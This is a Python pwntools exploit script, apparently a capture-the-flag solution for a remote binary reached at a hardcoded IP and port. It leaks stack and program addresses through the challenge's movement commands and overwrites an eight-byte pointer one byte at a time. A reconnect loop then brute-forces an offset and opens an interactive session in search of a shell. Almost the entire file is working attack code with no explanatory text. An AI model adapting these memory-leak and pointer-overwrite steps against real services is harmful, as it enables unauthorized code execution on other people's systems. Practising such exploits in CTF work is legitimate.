from pwn import *

context.log_level = "debug"

io = remote("120.46.65.156", 32104)
rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
# lg = lambda s: log.info("\033[1;31;40m %s --> 0x%x \033[0m" % (s, eval(s)))
lg = lambda s_name, s_val: print("\033[1;31;40m %s --> 0x%x \033[0m" % (s_name, s_val))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))


def convert(one_byte):
    temp_val = ord(one_byte)
    if temp_val >= 0 and temp_val < 0x20:
        return bytes([(temp_val + 0x20)])
    elif temp_val >= 0x20 and temp_val < 0x40:
        return bytes([(temp_val - 0x20)])
    elif temp_val >= 0x40 and temp_val < 0x60:
        return bytes([(temp_val + 0x20)])
    elif temp_val >= 0x60 and temp_val < 0x80:
        return bytes([(temp_val - 0x20)])
    elif temp_val >= 0x80 and temp_val < 0xA0:
        return bytes([(temp_val + 0x20)])
    elif temp_val >= 0xA0 and temp_val < 0xC0:
        return bytes([(temp_val - 0x20)])
    elif temp_val >= 0xC0 and temp_val < 0xE0:
        return bytes([(temp_val + 0x20)])
    elif temp_val >= 0xE0 and temp_val < 0x100:
        return bytes([(temp_val - 0x20)])


def cmd(insn, in_bin=False):
    if not in_bin:
        insn = insn.encode()
    ru(b"> ")
    sl(insn)


def change_8(now, target):
    now_list = p64(now)
    target_list = p64(target)
    for i in range(8):
        if now_list[i] < target_list[i]:
            temp = target_list[i] - now_list[i]
            cmd(i2b(temp) + b"wd", True)
        elif now_list[i] > target_list[i]:
            temp = now_list[i] - target_list[i]
            cmd(i2b(temp) + b"sd", in_bin=True)
        else:
            cmd("d")


def leak_up(word_off, GOBACK=True):
    cmd(str(word_off * 8) + "w" + str(word_off * 8) + "a")
    leak = u64_ex(ru(b"\n", "True")[:8])
    if GOBACK:
        cmd(str(word_off * 8) + "s" + str(word_off * 8) + "d")
    print(word_off, end="\t")
    lg("leak", leak)
    return leak


def leak_down(word_off, GOBACK=True):
    cmd(str(word_off * 8) + "s" + str(word_off * 8) + "d")
    leak = u64_ex(ru(b"\n", "True")[:8])
    if GOBACK:
        cmd(str(word_off * 8) + "w" + str(word_off * 8) + "a")
    print(word_off, end="\t")
    lg("leak", leak)
    return leak


def dump_stack(leak_times):
    stack_dump = []
    for i in range(leak_times):
        temp = leak_down(leak_times - i)
        stack_dump.append(temp)

    for i in range(leak_times):
        temp = leak_up(i)
        stack_dump.append(temp)

    for i in range(len(stack_dump)):
        # lg("stack", stack_dump[len(stack_dump) - 1 - i])
        lg("stack", stack_dump[i])


def burp(off):
    ru(b"A]aaaaaa")
    cmd("8d")
    stack_leak = leak_down(2)
    elf_leak = leak_down(1)

    cmd("8a")
    change_8(u64_ex(b"Aaaaaaa\x00"), elf_leak - 63)
    # change_8(u64_ex(b"Aaaaaaa\x00"), 0xDEADBEEF)
    # cmd("16a27s")
    cmd("16a" + str(off) + "w")

    # io.recvuntil(b"> ")
    # io.sendline(b"8a" + i2b(i) + b"s")
    # io.recvuntil(b"> ")
    # # io.sendline(i2b(i) + b"s")
    # # io.recvuntil(b"> ")
    # # io.sendline()
    io.interactive()


i = 0
while 1:
    io = remote("120.46.65.156", 32104)
    try:
        lg("i", i)
        i += 1
        burp(i)
        io.close()
    except:
        io.close()
